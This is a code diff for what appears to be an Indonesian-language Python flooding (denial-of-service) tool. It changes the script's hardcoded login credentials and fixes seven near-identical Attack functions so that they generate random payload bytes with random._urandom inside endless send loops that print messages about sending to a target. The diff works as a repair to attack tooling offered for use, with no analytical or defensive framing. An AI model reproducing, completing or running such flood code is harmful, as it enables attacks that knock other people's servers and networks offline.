@@ -26,8 +26,8 @@ month = now.month
 year = now.year
 
 def login():
-    user = "Jecoster"
-    passwd = "Jecoster"
+    user = "Crown_Enions"
+    passwd = "Crown_Enions"
     username = input(" 👑\033[1;33;40m Masukan Username Tools 👑: ")
     password = getpass.getpass(prompt='👑 Masukan Password Tools 👑: ')
     if username != user or password != passwd:
@@ -111,7 +111,7 @@ print(" [ ===============     ] 100%")
 os.system("clear")
 
 def Attack():
-	bytes = random._radint(3451)
+	bytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -126,7 +126,7 @@ def Attack():
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack2():
-	bytes = random._radint(3451)
+	bytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -141,7 +141,7 @@ def Attack2():
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack3():
-	bytes = random._radint(3451)
+	bytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -156,7 +156,7 @@ def Attack3():
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack4():
-	bytes = random._radint(3451)
+	bytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -171,7 +171,7 @@ def Attack4():
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack5():
-	bytes = random._radint(3451)
+	bytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -186,7 +186,7 @@ def Attack5():
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack6():
-	bytes = random._radint(3451)
+	bytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -201,7 +201,7 @@ def Attack6():
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 			
 def Attack7():
-	bytes = random._radint(3451)
+	bytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
